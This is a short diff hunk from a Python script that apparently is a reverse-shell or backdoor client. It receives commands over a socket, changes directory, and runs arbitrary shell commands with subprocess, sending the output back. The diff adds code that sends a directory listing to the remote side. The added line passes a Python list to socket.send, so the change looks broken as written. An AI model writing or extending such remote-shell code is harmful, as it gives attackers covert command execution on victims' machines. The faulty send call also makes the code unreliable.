@@ -17,7 +17,10 @@ while True:
             os.chdir('C:////')
         else:
             os.chdir(data[3:].decode("utf-8"))
-        s.send(str.encode(str(os.getcwd()) + ">!!> "))
+        # Send dir info
+        dirInfo = os.listdir()
+        dirInfo = [x.encode('utf-8') for x in dirInfo]
+        s.send([dirInfo ,str.encode(str(os.getcwd()) + ">!!> ")])
     elif len(data) > 0:
         cmd = subprocess.Popen(rawcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
